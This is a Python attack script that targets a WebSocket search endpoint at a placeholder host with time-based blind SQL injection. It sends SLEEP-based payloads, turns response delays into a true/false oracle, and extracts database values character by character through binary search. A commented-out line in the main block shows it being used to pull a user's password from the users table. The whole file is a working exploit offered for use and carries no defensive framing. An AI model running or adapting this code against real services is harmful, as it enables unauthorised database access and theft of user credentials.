#!/usr/bin/env python3

import json
import time


BASE_WS_URL = "wss://target.local/ws"



def websocket_example(cookies: dict | None = None):
    import websocket

    def on_message(ws, message):
        print(f"[<] {message}")

    def on_error(ws, error):
        print(f"[!] Error: {error}")

    def on_close(ws, close_status_code, close_msg):
        print("[*] Connection closed")

    def on_open(ws):
        print("[*] Open Connection, sending payload...")
        msg = json.dumps({"action": "search", "query": "test' AND SLEEP(5)-- -"})
        ws.send(msg)

    headers = None
    if cookies:
        cookie_str = "; ".join([f"{k}={v}" for k, v in cookies.items()])
        headers = [f"Cookie: {cookie_str}"]

    ws = websocket.WebSocketApp(
        BASE_WS_URL,
        header=headers,
        on_open=on_open,
        on_message=on_message,
        on_error=on_error,
        on_close=on_close,
    )
    ws.run_forever()


def ws_send_and_receive(message: dict, timeout: int = 10, cookies: dict | None = None) -> str:
    import websocket

    headers = None
    if cookies:
        cookie_str = "; ".join([f"{k}={v}" for k, v in cookies.items()])
        headers = [f"Cookie: {cookie_str}"]

    ws = websocket.create_connection(BASE_WS_URL, timeout=timeout, header=headers)
    try:
        ws.send(json.dumps(message))
        response = ws.recv()
    finally:
        ws.close()
    return response


def ws_is_true_time_based(condition_sql: str, delay: int = 5, cookies: dict | None = None) -> bool:
    import websocket

    payload = f"1' AND IF(({condition_sql}),SLEEP({delay}),0)-- -"
    headers = None
    if cookies:
        cookie_str = "; ".join([f"{k}={v}" for k, v in cookies.items()])
        headers = [f"Cookie: {cookie_str}"]

    start = time.time()
    try:
        ws = websocket.create_connection(BASE_WS_URL, timeout=delay + 10, header=headers)
        ws.send(json.dumps({"action": "search", "query": payload}))
        ws.recv()
        ws.close()
    except Exception:
        pass
    elapsed = time.time() - start
    return elapsed >= delay


def ws_dump_value(select_query: str, delay: int = 5, max_len: int = 64) -> str:
    def oracle(cond):
        return ws_is_true_time_based(cond, delay=delay)

    result = ""
    for pos in range(1, max_len + 1):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            cond = f"ASCII(SUBSTRING(({select_query}),{pos},1))>{mid}"
            if oracle(cond):
                low = mid + 1
            else:
                high = mid - 1
        cond_eq = f"ASCII(SUBSTRING(({select_query}),{pos},1))={low}"
        if not oracle(cond_eq):
            break
        result += chr(low)
        print(f"[+] {result}")
    return result


def ws_fuzz_actions(actions: list[str], cookies: dict | None = None):
   for action in actions:
        try:
            resp = ws_send_and_receive({"action": action}, cookies=cookies)
            print(f"[{action}] -> {resp[:200]}")
        except Exception as e:
            print(f"[{action}] -> ERROR: {e}")


if __name__ == "__main__":
    # websocket_example()
    # pwd = ws_dump_value("SELECT password FROM users WHERE id=1")
    pass